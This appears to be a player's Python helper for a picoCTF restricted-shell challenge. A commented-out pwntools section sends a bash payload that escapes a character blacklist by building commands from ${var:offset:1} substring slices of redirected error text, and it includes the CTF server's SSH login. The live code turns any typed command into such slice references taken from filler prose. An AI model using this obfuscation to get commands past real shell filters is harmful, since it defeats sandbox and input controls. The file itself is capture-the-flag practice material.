# from pwn import *

# payload = '''
# ~ 2> 9
# __1=$(<9)
# ${__1:17:1}${__1:2:1} > 8
# __2=$(<8)
# ${__2:16:2}${__2:21:1} ${__2:13:16} > 7
# ${__2:20:2}${__2:25:1} ${__2:17:16} > 7
# __3=$(<7)
# '''

# p = ssh('ctf-player', 'mimas.picoctf.net', 55583, '6dd28e9b')
# for line in payload.splitlines():
#     log.info("Sending")
#     p.sendline(line)
# p.interactive()

var=input("Calastran Variable: ")
var='__3'
calastran = '''
The Calastran multiverse is a complex and interconnected web of realities, each
with its own distinct characteristics and rules. At its core is the Nexus, a
cosmic hub that serves as the anchor point for countless universes and
dimensions. These realities are organized into Layers, with each Layer
representing a unique level of existence, ranging from the fundamental building
blocks of reality to the most intricate and fantastical realms. Travel between
Layers is facilitated by Quantum Bridges, mysterious conduits that allow
individuals to navigate the multiverse. Notably, the Calastran multiverse
exhibits a dynamic nature, with the Fabric of Reality continuously shifting and
evolving. Within this vast tapestry, there exist Nexus Nodes, focal points of
immense energy that hold sway over the destinies of entire universes. The
enigmatic Watchers, ancient beings attuned to the ebb and flow of the
multiverse, observe and influence key events. While the structure of Calastran
embraces diversity, it also poses challenges, as the delicate balance between
the Layers requires vigilance to prevent catastrophic breaches and maintain the
cosmic harmony.
'''
offset = -1
d = {}

for idx, c in enumerate(calastran):
    if c not in d:
        d[c] = idx

# actual garbage
while True:
    cmd = input("Command: ")
    for i in range(len(cmd)):
        c = cmd[i]
        if cmd[i] != ' ':
            if c in d.keys():
                print("${", end="")
                print(f"{var}", end="")
                print(":", end="")
                print(f"{d[c] + offset}", end="")
                print(":", end="")
                print("1", end="")
                print("}", end="")
            else:
                print(c, end="")
        else:
            print(" ", end="")
    print()
